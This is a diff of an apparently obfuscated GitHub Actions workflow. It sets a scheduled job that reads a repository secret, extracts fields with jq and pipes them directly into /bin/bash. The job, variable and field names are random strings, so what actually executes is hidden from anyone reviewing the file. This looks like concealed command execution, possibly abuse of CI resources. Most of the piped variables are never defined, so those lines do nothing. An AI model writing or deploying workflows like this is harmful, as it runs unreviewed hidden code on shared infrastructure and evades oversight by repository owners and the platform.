@@ -3,22 +3,21 @@ name: gelubang0987
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 5/6 * * *'
+    - cron: '10 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: gelubang0987
         env:
-          cmtn685: ${{ secrets.cmtn685 }}
+          hfkp73: ${{ secrets.hfkp73 }}
         run: |
-          echo $cmtn685 | jq -r .dhpl520 | /bin/bash
-          echo $vq8 | jq -r .oago7896 | /bin/bash
-          echo $rptv725 | jq -r .fat0 | /bin/bash
-          echo $a51 | jq -r .uvyqj6 | /bin/bash
-          echo $tqn054 | jq -r .ycrl6 | /bin/bash
-          echo $osz40 | jq -r .ldg537 | /bin/bash
-          echo $gga5445 | jq -r .ezzs4 | /bin/bash
+          echo $hfkp73 | jq -r .gozy80349 | /bin/bash
+          echo $dbubc039 | jq -r .u07 | /bin/bash
+          echo $c434 | jq -r .fq0029 | /bin/bash
+          echo $l424 | jq -r .pwev37027 | /bin/bash
+          echo $qu7 | jq -r .lsb3 | /bin/bash
+          echo $kv04935 | jq -r .t29 | /bin/bash
 
